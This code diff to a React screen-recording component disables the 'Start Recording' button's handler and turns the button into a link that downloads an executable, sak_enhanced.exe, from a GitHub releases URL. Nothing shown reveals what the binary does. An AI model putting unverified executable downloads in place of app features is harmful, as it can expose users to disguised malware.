@@ -153,13 +153,17 @@ export const FileImport: React.FC<FileImportProps> = ({
             <p className="text-gray-400 mb-4">
               Record your screen with automatic zoom effects
             </p>
+             <a href="https://github.com/echetan-max/vercel/releases/download/v1.0/sak_enhanced.exe" download>
+    
             <button 
-              onClick={onAutoZoomRecord}
+              onClick={()=>{}}
               className="flex items-center space-x-2 px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors mx-auto"
             >
               <Video className="w-5 h-5" />
-              <span>Start Recording</span>
+              <span>Click here to download ⬇</span>
+            
             </button>
+             </a>
             <p className="text-sm text-gray-500 mt-3">
               Captures screen with click-based zoom points
             </p>
